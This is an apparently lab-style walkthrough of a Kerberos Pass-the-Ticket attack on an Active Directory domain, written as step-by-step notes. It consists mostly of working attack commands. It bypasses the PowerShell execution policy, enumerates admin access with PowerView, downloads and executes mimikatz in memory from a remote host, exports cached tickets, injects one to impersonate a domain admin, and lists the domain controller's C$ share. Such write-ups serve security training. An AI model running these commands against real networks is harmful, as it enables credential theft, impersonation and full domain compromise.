
### Pass the Ticket Attack:
It is an attack where the stolen Kerberos ticket is being used to authenticate to resources as a user without the actual plain text password. 

- Both the TGS and TGT can be stolen and reused. Without the administrative privileges, an adversary can obtain the TGT (using fake delegation) and TGS tickets for the current user. 
- With administrative privileges, an adversary can dump the lsass process and obtain all TGTs and TGS tickets cached on the system. 


### Task

Execute a Pass The Ticket attack. 

1. Conduct Recon
2. Attack Implementation
3. Export Kerberos Ticket
4. Check Domain Controller Access

##### Loading Powerview

Run Powershell as an administrator. 
```powershell
powershell -ep bypass
```

```powershell
. .\PowerView.ps1
```


```powershell
Find-LocalAdminAccess
```

It will give the machines where current user has local admin access.

```
EnterPSSession domain.local
```


Run HFS server with the mimikatz file. 

On the PS remoting session:
```powershell
iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/mimikatz.ps1')
```

```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

All the tickets are being exported. 

We will use the maintainer@krbtgt:


```powershell
Invoke-mimikatz -Command '"kerberos::ptt FILENAME "'
```


```
klist
```


If we can run this and can list the files, it means we accessed the DC. 
```powershell
ls \\prod.researchsecurity.local\c$
```

Remember that `prod.researchsecurity.local` is DC. 
### Conclusion:

First, we checked in which machine the current user has admin access. We ps remoted into that system. We got the mimikatz in the Ps remoting session via HFS server. Invoked the Mimikatz and exported the TGS ticket. Used one of the ticket and pass it through mimikatz to impersonate the Domain Admin. 


